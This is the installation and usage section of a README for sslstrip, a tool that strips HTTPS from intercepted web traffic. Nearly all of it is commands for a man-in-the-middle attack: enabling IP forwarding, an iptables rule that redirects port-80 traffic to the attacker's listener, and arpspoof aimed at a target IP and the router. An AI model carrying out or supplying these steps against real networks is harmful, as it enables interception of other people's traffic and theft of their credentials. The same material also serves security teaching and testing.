Installing:
   pip3 install -r requirements.txt
   Run 'python setup.py install' as root to install or run it out of the directory.  

Running:
   sslstrip can be run from the source base without installation.  
   Run 'python3 sslstrip.py -h' as a non-root user to get the command-line options.

   1. Enable IP forwarding (as root):
      echo "1" > /proc/sys/net/ipv4/ip_forward

   2. Setup iptables to intercept HTTP requests (as root):
      iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort>
	
   3. Run sslstrip with the options you prefer.

   4. Run arpspoof to redirect traffic to your host (as root):
      arpspoof -i <your network interface> -t <target IP> <router IP>
